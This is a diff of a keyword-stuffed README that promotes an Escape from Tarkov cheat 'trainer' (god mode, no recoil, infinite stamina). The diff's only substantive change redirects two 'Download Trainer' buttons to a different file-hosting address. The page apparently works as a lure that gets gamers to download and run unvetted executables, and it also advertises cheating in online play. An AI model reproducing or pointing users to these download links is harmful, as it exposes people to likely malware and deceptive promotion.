@@ -2,7 +2,7 @@
 
 **Tired of dying to campers, broken limbs, and slow healing? With a Tarkov trainer, you can flip the survival script. Toggle God Mode, no recoil, XP boosts, infinite stamina, and become the true boss of the raid — solo or squad.**
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🎯 What is a Tarkov Trainer?
@@ -11,7 +11,7 @@ A **Tarkov trainer** is an external software tool that hooks into your game and 
 
 Trainers are ideal for players who want advantages but don’t need to go full rage mode.
 
-[![Download Trainer](https://newworld.video.tm/wp-content/uploads/sites/36/2022/02/FREE-ESCAPE-FROM-TARKOV-CHEAT-DOWNLOAD-EFT-HACK.jpg)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Trainer](https://newworld.video.tm/wp-content/uploads/sites/36/2022/02/FREE-ESCAPE-FROM-TARKOV-CHEAT-DOWNLOAD-EFT-HACK.jpg)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🔥 Features Common in Tarkov Trainers
@@ -94,3 +94,4 @@ tarkov trainer, escape from tarkov god mode, no recoil trainer eft, unlimited st
 ---
 
 **Train smarter. Fight harder.** With a Tarkov trainer, you control the raid environment, experiment with everything, and become raid-ready — all without losing a single ruble. 🧠🔫💼
+
